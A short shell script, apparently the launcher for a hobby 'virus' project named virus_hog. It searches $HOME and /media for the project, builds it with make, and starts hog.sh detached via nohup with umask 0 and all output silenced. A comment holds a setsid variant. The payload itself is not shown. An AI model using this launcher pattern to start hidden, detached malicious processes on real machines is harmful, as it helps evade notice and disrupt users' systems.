#!/bin/sh
PATH_HOGSH=$(find $HOME -name "virus_hog")
if [ -z "$PATH_HOGSH" ]; then
	PATH_HOGSH=$(find /media -name "virus_hog")
fi
make clean && make && cd /; umask 0; nohup sh "$PATH_HOGSH/hog.sh" 0<&- &>/dev/null & # $( cd /; umask 0; setsid  ~/workspace/myVirus/virus_hog/hog.sh </dev/null &>/dev/null & )
